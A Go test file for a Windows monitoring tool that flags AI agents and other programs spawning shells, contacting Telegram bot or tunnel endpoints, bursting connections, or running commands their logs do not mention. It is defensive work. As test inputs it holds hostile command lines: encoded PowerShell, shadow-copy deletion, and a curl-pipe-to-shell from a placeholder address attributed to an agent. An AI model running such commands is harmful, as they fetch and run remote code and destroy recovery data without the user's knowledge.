package service

import (
	"net"
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"tripsilk/internal/agentguard"
	"tripsilk/internal/channels"
	"tripsilk/internal/engine"
	"tripsilk/internal/evidence"
	"tripsilk/internal/journal"
	"tripsilk/internal/netmap"
	"tripsilk/internal/sensor"
)

func channelAlerts(s *Service) []engine.Alert {
	var out []engine.Alert
	for _, a := range s.Bus.History() {
		if a.Source == "channel" {
			out = append(out, a)
		}
	}
	return out
}

func trustAll(t *testing.T) {
	old := signed
	signed = func(string) bool { return true }
	t.Cleanup(func() { signed = old })
}

func TestTelegramBotFromScriptAlertsButTelegramDoesNot(t *testing.T) {
	trustAll(t)
	s, _ := New(t.TempDir())
	old := imagePath
	imagePath = func(pid uint32) string {
		switch pid {
		case 100:
			return `C:\Users\j\AppData\Roaming\Telegram Desktop\Telegram.exe`
		case 200:
			return `C:\Users\j\AppData\Local\Temp\helper.exe`
		}
		return ""
	}
	defer func() { imagePath = old }()

	s.onSensor(sensor.Event{Kind: sensor.DNS, PID: 100, Name: "api.telegram.org"})
	if n := len(channelAlerts(s)); n != 0 {
		t.Fatalf("Telegram itself raised %d alerts", n)
	}
	s.onSensor(sensor.Event{Kind: sensor.DNS, PID: 200, Name: "api.telegram.org",
		Answers: []netip.Addr{netip.MustParseAddr("149.154.167.220")}})
	al := channelAlerts(s)
	if len(al) != 1 || al[0].Severity != engine.SevHigh || al[0].Channel != "telegram-bot" || al[0].PID != 200 {
		t.Fatalf("helper.exe: %+v", al)
	}
	if !strings.Contains(al[0].Detail, "api.telegram.org") || al[0].Actions[0] != "allowchannel" {
		t.Errorf("alert lacks evidence or allow action: %+v", al[0])
	}
	// The same program again within the dedup window: quiet.
	s.onSensor(sensor.Event{Kind: sensor.DNS, PID: 200, Name: "api.telegram.org"})
	if n := len(channelAlerts(s)); n != 1 {
		t.Fatalf("repeat alerted: %d", n)
	}
	// After Allow for this app, a fresh window stays quiet too.
	if err := s.AllowChannel(`C:\Users\j\AppData\Local\Temp\helper.exe`, "telegram-bot"); err != nil {
		t.Fatal(err)
	}
	s.sn.chanHit = map[string]time.Time{}
	s.onSensor(sensor.Event{Kind: sensor.DNS, PID: 200, Name: "api.telegram.org"})
	if n := len(channelAlerts(s)); n != 1 {
		t.Fatalf("allowed program alerted: %d", n)
	}
}

func TestConnectNamedOnlyFromOwnLookupExceptTelegram(t *testing.T) {
	s, _ := New(t.TempDir())
	old := imagePath
	imagePath = func(pid uint32) string {
		switch pid {
		case 300:
			return `C:\tools\python.exe`
		case 400:
			return `C:\tools\other.exe`
		}
		return `C:\Program Files\Google\Chrome\Application\chrome.exe`
	}
	defer func() { imagePath = old }()
	trustAll(t)
	// The browser looked up a tunnel name on a shared address; another
	// program connecting to that address is not named from it.
	s.onSensor(sensor.Event{Kind: sensor.DNS, PID: 50, Name: "abc.ngrok-free.app",
		Answers: []netip.Addr{netip.MustParseAddr("3.125.1.2")}})
	s.onSensor(sensor.Event{Kind: sensor.Connect, PID: 400, Remote: netip.MustParseAddrPort("3.125.1.2:443")})
	if n := len(channelAlerts(s)); n != 0 {
		t.Fatalf("borrowed name alerted: %d", n)
	}
	// Its own lookup (event missed by the DNS check, e.g. lookup failed to parse) names it.
	s.sn.names[netip.MustParseAddr("3.125.9.9")] = ipName{name: "x.ngrok-free.app", pid: 300, at: time.Now()}
	s.onSensor(sensor.Event{Kind: sensor.Connect, PID: 300, Remote: netip.MustParseAddrPort("3.125.9.9:443")})
	al := channelAlerts(s)
	if len(al) != 1 || al[0].Process != `C:\tools\python.exe` || !strings.Contains(al[0].Title, "tunnel") {
		t.Fatalf("own lookup not used: %+v", al)
	}
	// python.exe is a host: no Allow offered, and Allow is refused.
	if contains(al[0].Actions, "allowchannel") {
		t.Errorf("Allow offered for a host: %v", al[0].Actions)
	}
	if err := s.AllowChannel(`C:\tools\python.exe`, "tunnel"); err == nil {
		t.Error("Allow accepted for python.exe")
	}
	// Telegram's own addresses: a borrowed name is fine.
	s.onSensor(sensor.Event{Kind: sensor.DNS, PID: 50, Name: "api.telegram.org",
		Answers: []netip.Addr{netip.MustParseAddr("149.154.167.220")}})
	s.onSensor(sensor.Event{Kind: sensor.Connect, PID: 400, Remote: netip.MustParseAddrPort("149.154.167.220:443")})
	if n := len(channelAlerts(s)); n != 2 {
		t.Fatalf("telegram connect not named: %d", n)
	}
	before := len(channelAlerts(s))
	// Private and loopback addresses are never looked up.
	s.onSensor(sensor.Event{Kind: sensor.Connect, PID: 300, Remote: netip.MustParseAddrPort("127.0.0.1:443")})
	if len(channelAlerts(s)) != before {
		t.Fatal("loopback connect alerted")
	}
}

func TestSelfAndBrowsersIgnored(t *testing.T) {
	trustAll(t)
	s, _ := New(t.TempDir())
	old := imagePath
	imagePath = func(pid uint32) string { return `C:\Program Files\Mozilla Firefox\firefox.exe` }
	defer func() { imagePath = old }()
	s.onSensor(sensor.Event{Kind: sensor.DNS, PID: 77, Name: "pastebin.com"})
	s.onSensor(sensor.Event{Kind: sensor.DNS, PID: s.sn.selfPID, Name: "api.telegram.org"})
	if n := len(channelAlerts(s)); n != 0 {
		t.Fatalf("%d alerts", n)
	}
}

func TestSensorSpawnAlertsOnceEvenIfSnapshotSeesIt(t *testing.T) {
	s, _ := New(t.TempDir())
	t0 := time.Now().Add(-time.Minute)
	agent := agentguard.Proc{PID: 10, PPID: 1, Name: "claude.exe", Image: `C:\x\claude.exe`, Created: t0}
	s.ag.roots.Mark([]agentguard.Proc{agent}, map[uint32]bool{10: true})
	s.ag.table = map[uint32]agentguard.Proc{10: agent}
	// The baseline poll, before the child exists.
	s.ag.spawns.Observe([]agentguard.Proc{agent}, map[uint32]bool{10: true})

	c1 := time.Now()
	s.onSensor(sensor.Event{Kind: sensor.ProcStart, PID: 11, PPID: 10, Image: `C:\Windows\System32\cmd.exe`, Created: c1,
		CmdLine: `cmd.exe /c echo hi`})
	s.onSensor(sensor.Event{Kind: sensor.ProcStart, PID: 12, PPID: 11, Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		Created: c1.Add(time.Millisecond), CmdLine: `powershell -enc SQBFAFgA`})
	var crit, notice int
	for _, a := range s.Bus.History() {
		if a.Source != "agent" {
			continue
		}
		switch a.Severity {
		case engine.SevCritical:
			crit++
			if a.PID != 10 || a.Process != `C:\x\claude.exe` {
				t.Errorf("alert names the wrong agent: %+v", a)
			}
			// The chain comes from the sensor's own table, before any snapshot.
			if a.Evidence == nil || len(a.Evidence.Chain) == 0 || a.Evidence.Chain[0].PID != 10 {
				t.Errorf("real-time spawn alert has no parent chain: %+v", a.Evidence)
			}
		case engine.SevLow:
			notice++
		}
	}
	if crit != 1 || notice != 1 {
		t.Fatalf("crit %d notice %d, want 1 and 1", crit, notice)
	}
	// The next poll sees both children alive: no second alert.
	procs := []agentguard.Proc{agent,
		{PID: 11, PPID: 10, Name: "cmd.exe", Image: `C:\Windows\System32\cmd.exe`, Created: c1},
		{PID: 12, PPID: 11, Name: "powershell.exe", Image: `x\powershell.exe`, Created: c1.Add(time.Millisecond)}}
	if sp := s.ag.spawns.Observe(procs, map[uint32]bool{10: true}); len(sp) != 0 {
		t.Fatalf("poll re-reported %d spawns", len(sp))
	}
}

func TestUnrelatedProcessStartIgnored(t *testing.T) {
	s, _ := New(t.TempDir())
	s.onSensor(sensor.Event{Kind: sensor.ProcStart, PID: 21, PPID: 20, Image: `C:\Windows\System32\cmd.exe`, Created: time.Now(), CmdLine: "cmd /c vssadmin delete shadows"})
	for _, a := range s.Bus.History() {
		if a.Source == "agent" {
			t.Fatalf("non-agent spawn alerted: %+v", a)
		}
	}
	if _, ok := s.ag.table[21]; !ok {
		t.Fatal("start not recorded in the process table")
	}
	s.onSensor(sensor.Event{Kind: sensor.ProcStop, PID: 21})
	if _, ok := s.ag.table[21]; ok {
		t.Fatal("stop not removed from the process table")
	}
}

func TestMergeTableKeepsFreshSensorEntries(t *testing.T) {
	now := time.Now()
	old := map[uint32]agentguard.Proc{
		5: {PID: 5, Created: now.Add(-time.Second)},
		6: {PID: 6, Created: now.Add(-time.Hour)},
	}
	got := mergeTable(old, []agentguard.Proc{{PID: 1, Created: now.Add(-time.Hour)}}, now)
	if _, ok := got[5]; !ok {
		t.Error("fresh sensor entry dropped")
	}
	if _, ok := got[6]; ok {
		t.Error("stale entry kept")
	}
	if _, ok := got[1]; !ok {
		t.Error("snapshot entry missing")
	}
}

func TestCoverageReflectsSensor(t *testing.T) {
	on := Snapshot{AgentGuard: true}
	on.Sensor.Running = true
	yes, no := coverage(on)
	if !strings.Contains(strings.Join(yes, "|"), "event tracing") || strings.Contains(strings.Join(no, "|"), "about a second") ||
		!strings.Contains(strings.Join(no, "|"), "DNS over HTTPS") {
		t.Errorf("sensor on: %v / %v", yes, no)
	}
	off := Snapshot{AgentGuard: true}
	off.Sensor.Error = "access denied"
	_, no = coverage(off)
	if !strings.Contains(strings.Join(no, "|"), "access denied") || !strings.Contains(strings.Join(no, "|"), "about a second") {
		t.Errorf("sensor off: %v", no)
	}
}

func TestLoopbackNotJournaled(t *testing.T) {
	if journaled(sensor.Event{Kind: sensor.Connect, Remote: netip.MustParseAddrPort("127.0.0.1:80")}) {
		t.Error("loopback journaled")
	}
	if !journaled(sensor.Event{Kind: sensor.Connect, Remote: netip.MustParseAddrPort("1.1.1.1:443")}) ||
		!journaled(sensor.Event{Kind: sensor.ProcStart}) {
		t.Error("real events dropped")
	}
}

func TestAlertsCarryHashAndParentChain(t *testing.T) {
	s, _ := New(t.TempDir())
	exe := t.TempDir() + "/helper.exe"
	os.WriteFile(exe, []byte("abc"), 0o600)
	t0 := time.Now()
	s.mu.Lock()
	s.storeProcView(map[uint32]agentguard.Proc{
		10: {PID: 10, PPID: 5, Image: `C:\x\claude.exe`, Created: t0},
		11: {PID: 11, PPID: 10, Image: exe, Created: t0.Add(time.Second)},
	})
	s.mu.Unlock()
	s.Bus.Publish(engine.Alert{Severity: engine.SevHigh, Source: "channel", PID: 11, Process: exe,
		Evidence: &engine.Evidence{Destination: "api.telegram.org"}})
	a := s.Bus.History()[0]
	e := a.Evidence
	if e == nil || e.SHA256 != "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad" ||
		len(e.Chain) != 2 || e.Chain[1].Image != `C:\x\claude.exe` || e.Destination != "api.telegram.org" {
		t.Fatalf("evidence %+v", e)
	}
	// A PID now belonging to a different program gets no chain.
	s.Bus.Publish(engine.Alert{Source: "x", PID: 10, Process: exe})
	if c := s.Bus.History()[0].Evidence.Chain; c != nil {
		t.Fatalf("chain for mismatched program: %v", c)
	}
	// Alerts not about a program stay without evidence.
	s.Bus.Publish(engine.Alert{Source: "system", Title: "x"})
	if s.Bus.History()[0].Evidence != nil {
		t.Fatal("system alert got evidence")
	}
}

func TestUnsignedLookalikeBrowserAlerts(t *testing.T) {
	s, _ := New(t.TempDir())
	old := imagePath
	imagePath = func(uint32) string { return `C:\Users\j\AppData\Local\Temp\chrome.exe` }
	defer func() { imagePath = old }()
	oldS := signed
	signed = func(string) bool { return false }
	defer func() { signed = oldS }()
	s.onSensor(sensor.Event{Kind: sensor.DNS, PID: 9, Name: "api.telegram.org"})
	if n := len(channelAlerts(s)); n != 1 {
		t.Fatalf("unsigned chrome.exe exempt: %d alerts", n)
	}
}

// Every plain-language alert recommends an action it actually offers.
func TestPlainAlertsRecommendAnOfferedAction(t *testing.T) {
	flow := netmap.Flow{PID: 9, Image: `C:\x\agent.exe`, Provider: "OpenAI", Remote: "1.2.3.4:443"}
	agent := agentguard.Proc{PID: 1, Image: `C:\x\claude.exe`}
	child := func(name, cmd string) agentguard.Spawn {
		return agentguard.Spawn{Agent: agent, Child: agentguard.Proc{PID: 2, Name: name, CmdLine: cmd}}
	}
	tg, _ := channels.Match("api.telegram.org")
	alerts := []engine.Alert{
		flowAlert(flow), ruleAlert(flow, []string{"Anthropic"}),
		spawnAlert(child("powershell.exe", "powershell -enc AAA"), agentguard.Classify(agentguard.Proc{Name: "powershell.exe", CmdLine: "powershell -enc AAA"})),
		spawnAlert(child("certutil.exe", "certutil"), agentguard.Classify(agentguard.Proc{Name: "certutil.exe"})),
		spawnAlert(child("cmd.exe", "cmd /c dir"), agentguard.Classify(agentguard.Proc{Name: "cmd.exe", CmdLine: "cmd /c dir"})),
		channelAlert(5, `C:\x\bot.exe`, "api.telegram.org", "looked up", tg),
		channelAlert(5, `C:\x\python.exe`, "api.telegram.org", "looked up", tg),
		listenerAlert(netmap.Listener{PID: 3, Image: `C:\x\srv.exe`, Port: 8080}),
	}
	for _, a := range alerts {
		if a.Summary == "" || a.Why == "" {
			t.Errorf("%q has no plain text", a.Title)
		}
		if a.Do != "" && !contains(a.Actions, a.Do) {
			t.Errorf("%q recommends %q but offers %v", a.Title, a.Do, a.Actions)
		}
		if strings.Contains(a.Summary, "..") || strings.Contains(a.Why, "..") {
			t.Errorf("%q: doubled period: %q / %q", a.Title, a.Summary, a.Why)
		}
	}
}

func TestFreshInstallKeepsManualButtonsWorking(t *testing.T) {
	// Practice mode also turns the manual Suspend/Block buttons into "logged,
	// not done", so a new install must not start in it.
	s, _ := New(t.TempDir())
	if s.store.Get().DryRun {
		t.Fatal("fresh install starts in practice mode")
	}
}

func TestCreateTriplineNeverTakesOverAFile(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	s, _ := New(t.TempDir())
	os.MkdirAll(home+"/Documents/Archive", 0o755)
	mine := home + "/Documents/Archive/old-projects-index.txt"
	os.WriteFile(mine, []byte("my real notes"), 0o600)
	p, err := s.CreateTripline()
	if err != nil {
		t.Fatal(err)
	}
	if p == mine || !strings.HasSuffix(p, "old-projects-index-2.txt") {
		t.Fatalf("got %s", p)
	}
	if b, _ := os.ReadFile(mine); string(b) != "my real notes" {
		t.Fatal("user's file changed")
	}
	if len(s.store.Get().BaitFiles) != 1 {
		t.Fatal("trip line not registered")
	}
	if p2, _ := s.CreateTripline(); p2 != p {
		t.Fatalf("second call made another file: %s", p2)
	}
	if err := s.FinishSetup(); err != nil || !s.Snapshot().SetupDone {
		t.Fatal("setup not recorded")
	}
}

func TestOwnTrafficIsCountedNotAlerted(t *testing.T) {
	s, _ := New(t.TempDir())
	me := s.sn.selfPID
	s.onSensor(sensor.Event{Kind: sensor.Connect, PID: me, Remote: netip.MustParseAddrPort("127.0.0.1:80")})
	s.onSensor(sensor.Event{Kind: sensor.ProcStart, PID: 99, PPID: me, Image: `C:\Windows\System32\netsh.exe`, Created: time.Now()})
	if n := s.Snapshot().Sensor.OwnTraffic; n != 0 {
		t.Fatalf("local activity counted as network traffic: %d", n)
	}
	s.onSensor(sensor.Event{Kind: sensor.DNS, PID: me, Name: "api.openai.com"})
	s.onSensor(sensor.Event{Kind: sensor.Connect, PID: me, Remote: netip.MustParseAddrPort("1.2.3.4:443")})
	snap := s.Snapshot()
	if snap.Sensor.OwnTraffic != 2 || !strings.Contains(snap.Sensor.OwnLast, "1.2.3.4") {
		t.Fatalf("own traffic %d %q", snap.Sensor.OwnTraffic, snap.Sensor.OwnLast)
	}
	if n := len(channelAlerts(s)); n != 0 {
		t.Fatal("own traffic alerted")
	}
	snap.Sensor.Running = true
	_, no := coverage(snap)
	if !strings.Contains(strings.Join(no, "|"), "sent network traffic itself 2 times") {
		t.Fatalf("coverage hides own traffic: %v", no)
	}
}

func TestReportCarriesEvidenceInsideTheFence(t *testing.T) {
	now := time.Now()
	hist := []engine.Alert{{Time: now, Severity: engine.SevHigh, Source: "channel", Title: "x", PID: 5, Process: `C:\x\bot.exe`,
		Evidence: &engine.Evidence{SHA256: strings.Repeat("ab", 32), Destination: "api.telegram.org",
			Chain: []evidence.Link{{PID: 5, Image: `C:\x\bot.exe`}, {PID: 4, Image: "C:\\x\\evil```.exe"}}}}}
	out := newReporter(`C:\Users\Jo`).build(Snapshot{}, hist, now)
	i := strings.Index(out, "sha256: "+strings.Repeat("ab", 32))
	j := strings.Index(out, "started by: ")
	if i < 0 || j < 0 || !strings.Contains(out, "destination: api.telegram.org") {
		t.Fatalf("evidence missing:\n%s", out)
	}
	if strings.Contains(out, "evil```") {
		t.Fatal("backticks from a program path survived into the report")
	}
	if open := strings.LastIndex(out[:i], "```text"); open < 0 || strings.Contains(out[open:i], "\n```\n") {
		t.Fatal("evidence isn't inside the fenced block")
	}
}

func TestAIConnectionTriggersEarlyScanOncePerSecond(t *testing.T) {
	s, _ := New(t.TempDir())
	s.lookupProvider = func(ip net.IP) string {
		if ip.String() == "160.79.104.10" {
			return "Anthropic"
		}
		return ""
	}
	s.onSensor(sensor.Event{Kind: sensor.Connect, PID: 50, Remote: netip.MustParseAddrPort("8.8.4.4:443")})
	for i := 0; i < 5; i++ {
		s.onSensor(sensor.Event{Kind: sensor.Connect, PID: 50, Remote: netip.MustParseAddrPort("160.79.104.10:443")})
	}
	deadline := time.Now().Add(2 * time.Second)
	for s.nudges.Load() == 0 && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	time.Sleep(50 * time.Millisecond)
	if n := s.nudges.Load(); n != 1 {
		t.Fatalf("%d early scans, want 1", n)
	}
}

func burstService(t *testing.T) *Service {
	s, _ := New(t.TempDir())
	t0 := time.Now().Add(-time.Minute)
	agent := agentguard.Proc{PID: 10, PPID: 1, Name: "claude.exe", Image: `C:\x\claude.exe`, Created: t0}
	s.ag.roots.Mark([]agentguard.Proc{agent}, map[uint32]bool{10: true})
	s.ag.table = map[uint32]agentguard.Proc{10: agent}
	s.ag.spawns.Observe([]agentguard.Proc{agent}, map[uint32]bool{10: true})
	return s
}

func burstAlerts(s *Service) (out []engine.Alert) {
	for _, a := range s.Bus.History() {
		if a.Source == "burst" {
			out = append(out, a)
		}
	}
	return
}

func TestSpawnBurstAlertsOnceNamesTheAgent(t *testing.T) {
	s := burstService(t)
	c := time.Now()
	for i := 0; i < 60; i++ {
		s.onSensor(sensor.Event{Kind: sensor.ProcStart, PID: uint32(100 + i), PPID: 10, Image: `C:\Windows\System32\cmd.exe`,
			Created: c.Add(time.Duration(i) * 20 * time.Millisecond), CmdLine: "cmd /c exit"})
	}
	b := burstAlerts(s)
	if len(b) != 1 || b[0].PID != 10 || b[0].Process != `C:\x\claude.exe` || b[0].Do != "suspend" || b[0].Summary == "" {
		t.Fatalf("burst alerts: %+v", b)
	}
	if !strings.Contains(b[0].Summary, "40 shells or network tools in 10 seconds") {
		t.Fatalf("summary: %s", b[0].Summary)
	}
}

func TestDestinationBurstFromAgentChildOnly(t *testing.T) {
	s := burstService(t)
	s.ag.table[11] = agentguard.Proc{PID: 11, PPID: 10, Image: `C:\x\node.exe`, Created: time.Now()}
	s.ag.table[50] = agentguard.Proc{PID: 50, PPID: 1, Image: `C:\x\browser.exe`, Created: time.Now()}
	connect := func(pid uint32, i int) {
		a := netip.AddrFrom4([4]byte{93, byte(i), 0, 1})
		s.onSensor(sensor.Event{Kind: sensor.Connect, PID: pid, Remote: netip.AddrPortFrom(a, 443)})
	}
	for i := 0; i < 30; i++ {
		connect(50, i) // an ordinary browser: never counted
	}
	if b := burstAlerts(s); len(b) != 0 {
		t.Fatalf("non-agent counted: %+v", b)
	}
	for i := 0; i < 30; i++ {
		connect(11, i)
	}
	b := burstAlerts(s)
	if len(b) != 1 || b[0].PID != 10 || !strings.Contains(b[0].Detail, "93.11.0.0/24") {
		t.Fatalf("burst alerts: %+v", b)
	}
	// One host on many addresses counts once.
	s2 := burstService(t)
	s2.ag.table[11] = agentguard.Proc{PID: 11, PPID: 10, Image: `C:\x\node.exe`, Created: time.Now()}
	for i := 0; i < 30; i++ {
		a := netip.AddrFrom4([4]byte{104, byte(i), 0, 1})
		s2.onSensor(sensor.Event{Kind: sensor.DNS, PID: 11, Name: "registry.npmjs.org", Answers: []netip.Addr{a}})
		s2.onSensor(sensor.Event{Kind: sensor.Connect, PID: 11, Remote: netip.AddrPortFrom(a, 443)})
	}
	if b := burstAlerts(s2); len(b) != 0 {
		t.Fatalf("one host counted as many: %+v", b)
	}
}

func TestBuildStormIsNotABurst(t *testing.T) {
	s := burstService(t)
	c := time.Now()
	for i := 0; i < 200; i++ {
		img := `C:\Program Files\Go\pkg\tool\windows_amd64\compile.exe`
		if i%2 == 1 {
			img = `C:\Program Files\nodejs\node.exe`
		}
		s.onSensor(sensor.Event{Kind: sensor.ProcStart, PID: uint32(1000 + i), PPID: 10, Image: img,
			Created: c.Add(time.Duration(i) * 5 * time.Millisecond)})
	}
	if b := burstAlerts(s); len(b) != 0 {
		t.Fatalf("a build counted as a burst: %+v", b)
	}
}

func TestRecapReadsTheJournal(t *testing.T) {
	s, _ := New(t.TempDir())
	j, err := journal.Open(t.TempDir(), 0, 0)
	if err != nil {
		t.Fatal(err)
	}
	s.mu.Lock()
	s.sn.j = j
	s.mu.Unlock()
	s.Bus.Subscribe(func(a engine.Alert) { j.Write("alert", a) })
	if s.Snapshot().Recap != nil {
		t.Fatal("recap before the first build")
	}
	s.Bus.Publish(engine.Alert{Severity: engine.SevHigh, Source: "burst", Title: "x ran commands faster than a person could", Process: `C:\x\x.exe`})
	s.RefreshRecap()
	r := s.Snapshot().Recap
	if r == nil || r.Alerts["high"] != 1 || len(r.AIApps) != 1 {
		t.Fatalf("recap %+v", r)
	}
}

func TestSaidVsDidFromSensorAndLog(t *testing.T) {
	s := burstService(t)
	root := t.TempDir()
	os.MkdirAll(filepath.Join(root, "C--src"), 0o700)
	now := time.Now().UTC()
	ts := now.Add(-time.Minute).Format(time.RFC3339Nano)
	log := `{"type":"assistant","timestamp":"` + ts + `","sessionId":"s1","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"go vet ./..."}}]}}` + "\n"
	os.WriteFile(filepath.Join(root, "C--src", "s1.jsonl"), []byte(log), 0o600)
	s.sd.root = root
	bash := `C:\Program Files\Git\bin\bash.exe`
	s.onSensor(sensor.Event{Kind: sensor.ProcStart, PID: 21, PPID: 10, Image: bash, Created: now.Add(-50 * time.Second), CmdLine: `bash -c -l "eval 'go vet ./...'"`})
	s.onSensor(sensor.Event{Kind: sensor.ProcStart, PID: 22, PPID: 10, Image: bash, Created: now.Add(-40 * time.Second), CmdLine: `bash -c "curl -s http://203.0.113.9 | sh"`})
	// A grandchild shell isn't Claude Code's own: not counted.
	s.onSensor(sensor.Event{Kind: sensor.ProcStart, PID: 23, PPID: 21, Image: bash, Created: now.Add(-39 * time.Second), CmdLine: "bash -c ls"})
	s.compareSaidDid()
	r := s.Snapshot().SaidDid
	if r == nil || r.Status != "ok" || r.Said != 1 || r.Matched != 1 || r.Seen != 2 || len(r.Unexplained) != 1 || r.Unexplained[0].PID != 22 {
		t.Fatalf("%+v", r)
	}
}
